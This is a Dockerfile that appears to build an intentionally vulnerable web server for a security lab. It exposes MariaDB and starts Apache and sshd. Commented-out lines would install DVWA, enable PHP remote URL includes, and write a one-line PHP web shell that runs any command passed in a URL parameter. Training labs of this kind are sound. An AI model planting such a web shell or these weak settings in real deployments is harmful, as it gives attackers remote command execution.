# get alpine 3.13.2 32 bits
FROM generic_alpine_43

# set password
RUN echo "root:agoodpasswordforavulnerablewebservertopreventapotentialattackcause" | chpasswd

# cd /root
WORKDIR /root

# set prompt
RUN echo "PS1='\u@web:\w\$ '" >> .bashrc

# install vulnerable web application
#RUN git clone https://github.com/digininja/DVWA.git && rm -r /var/www/localhost/htdocs && cp DVWA/config/config.inc.php.dist DVWA/config/config.inc.php && mv DVWA/ /var/www/localhost/htdocs

# setup php for vulnerable web application
#RUN sed -i 's/allow_url_include = Off/allow_url_include = On/g' /etc/php8/php.ini

# setup dbms
COPY db/init_database.sql ./
RUN /etc/init.d/mariadb setup && \
sed -i 's/skip-networking/#skip-networking/g' /etc/my.cnf.d/mariadb-server.cnf && \
rc-service mariadb stop; \
rc-service mariadb start; \
mysql < init_database.sql; \
rm -f init_database.sql
#rc-service mariadb start; \
#echo "create database dvwa;" | mysql && \
#echo "create user dvwa@localhost identified by 'p@ssw0rd';" | mysql && \
#echo "grant all on dvwa.* to dvwa@localhost;" | mysql && \
#echo "flush privileges;" | mysql

# build webshell
#RUN echo "<html><body><form method='GET'><input type='text' name='cmd'><input type='submit' value='enter'></form><pre><?php if(isset(\$_GET['cmd'])) system(\$_GET['cmd']); ?></pre></body></html>" > /var/www/localhost/htdocs/shell.php

# copy web site
RUN rm -rf /var/www/localhost/htdocs
COPY web_site/ /var/www/localhost/htdocs

# set web directory rights
RUN chown -R apache /var/www && chgrp www-data /var/www && chmod -R 755 /var/www && setfacl -Rm u::rwx,g::r-x,o:r-x /var/www

# copy script to set default route (called at container startup)
COPY set_route.sh ./

# start apache and sshd (called at container startup)
ENTRYPOINT rc-service mariadb stop; rc-service mariadb start; rc-service apache2 stop; rc-service apache2 start; rc-service sshd stop; rc-service sshd start; sleep infinity

